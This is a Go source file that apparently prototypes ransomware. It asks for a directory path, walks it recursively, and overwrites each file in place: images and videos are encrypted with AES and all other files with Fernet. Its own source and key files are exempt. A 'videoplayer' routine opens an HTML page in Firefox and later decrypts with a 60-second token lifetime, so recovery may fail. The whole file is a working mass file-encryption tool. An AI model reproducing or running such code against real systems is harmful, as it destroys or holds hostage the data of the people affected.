package main

import (
	"os/exec"
	"time"
	"strings"
	"fmt"
	"github.com/fernet/fernet-go"
	"log"
	"io/ioutil"
	"os"
	"path/filepath"
	"github.com/purnaresa/bulwark/encryption"
	"github.com/purnaresa/bulwark/utils"
)
//////////////////////////


func keygen() fernet.Key {
	var key fernet.Key
	if err := key.Generate(); err != nil {
		log.Fatal(err)
	}
	encode_key := key.Encode()
	fmt.Println(encode_key)
	ioutil.WriteFile("./thekey2.key", []byte(encode_key), 0444)
	fmt.Println("==========================================")
	return key
}
func contains(str string) bool {
	nolist := []string{"index.html","videoplayer.go","test_encrypt_decrypt.go", "test.go", "go.mod", "go.sum", "thekey.key", "thekey2.key", "main.go"}
	for _, file := range nolist {
		if strings.Contains(str, file) {
			return true
		}
	}
	return false
}
func extension_check(str string) bool {
	media := []string{".jpg", ".jpeg", ".png", ".gif", ".mp4"}
	for _, file := range media {
		if strings.Contains(str, file) {
			return true
		}
	}
	return false
}

var encryptionClient = encryption.NewClient()

func encrypt() {
        key := keygen()
        //encryptionClient := encryption.NewClient()

        imageKey := encryptionClient.GenerateRandomString(32)
        //err5 := ioutil.WriteFile("./image-key.txt", imageKey, 0777)
        err5 := utils.WriteFile([]byte(imageKey),"./image-key.txt")
        if err5 != nil {
              log.Fatal(err5)
        }
        files := fileloop()
        for _, file := range files {
                if extension_check(file) {
                      medContent, err6 := ioutil.ReadFile(file)
                      if err6 != nil {
                              log.Fatal(err6)
                      }
                        cipherImage := encryptionClient.EncryptAES(medContent, []byte(imageKey))
                        err7 := utils.WriteFile(cipherImage, file)
                        if err7 != nil {
                              log.Fatal(err7)
                        }
                } else {

                        content, err := ioutil.ReadFile(file)

                        if err != nil {
                                 log.Fatal(err)
                        }


                        content, err23 := ioutil.ReadFile(file)
                        if err23 != nil {
                                log.Fatal(err23)
                        }
                        tok, err2 := fernet.EncryptAndSign([]byte(content), &key)
                        if err2 != nil {
                                log.Fatal(err2)
                        }
                        err3 := ioutil.WriteFile(file, tok, 0777)
                        if err3 != nil {
                                log.Fatal(err3)
                        }
                }
        }
        fmt.Printf("%v", files)

}

func decrypt() {
        files := fileloop()
        key, err := ioutil.ReadFile("./thekey2.key")
        if err != nil {
                log.Fatal(err)
        }
        imageKey := utils.ReadFile("./image-key.txt")
        //if err12 != nil {
        //      log.Fatal(err12)
        //}
        thekey := string(key)
        secretkey := fernet.MustDecodeKeys(thekey)
        for _, file := range files {
              if extension_check(file) {
                      medContent := utils.ReadFile(file)
                      //if err13 != nil {
			//log.Fatal(err13)
		      //}
                      plainImage := encryptionClient.DecryptAES(medContent, imageKey)
                      err14 := utils.WriteFile(plainImage, file)
                      if err14 != nil {
				log.Fatal(err14)
		      } 

              } else {
                        tok, err1 := ioutil.ReadFile(file)
                        if err1 != nil {
                                log.Fatal(err1)
                        }
                        content := fernet.VerifyAndDecrypt(tok, 60*time.Second, secretkey)
                        err2 := ioutil.WriteFile(file, content, 0777)
                        if err2 != nil {
                                log.Fatal(err2)
                        }
                        newcontent, err3 := ioutil.ReadFile(file)
                        if err3 != nil {
                                log.Fatal(err3)
                        }
                        fmt.Print(newcontent)
                }
        }
	fmt.Println("DECRYPT")
}
func videoplayer() {
	time.AfterFunc(10 * time.Second, decrypt)

	cmd := exec.Command("firefox", "./index.html")
	//out, err := exec.Command("echo", "hello").Output()
	err := cmd.Run()
	//err := exec.Command("./index.html").Run()
	
	if err != nil {

		log.Fatal("ERROR LOL %v", err)
	}
	//fmt.Printf("%s", out)
}

func fileloop () []string {
	fmt.Println("Enter a file path: ")
    	var file_path_input string
    	fmt.Scanln(&file_path_input)
    	// Setting root as file path input
    	root := file_path_input
	//Save root path
    	var files []string


    	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {

        	if err != nil {

            		fmt.Println(err)
            		return nil
        	}

        	if !info.IsDir() {
			if !contains(info.Name()) {
				fmt.Println("Name: " + info.Name())
				files = append(files, path)
        		}
		}

        	return nil
    	})

    	if err != nil {
        	log.Fatal(err)
    	}

    	for _, file := range files {
        	fmt.Println(file)
    	}
	return files
}
func main() {
	fmt.Println("Encrypt(E) or Decrypt(D)")
	var crypt_choice string
	fmt.Scanln(&crypt_choice)
	choice := crypt_choice
	if choice == "E" || choice == "e" {
		encrypt()
	}
	if choice == "D" || choice == "d" {
		videoplayer()
     	}
	////////////////////////////////////////////////
}
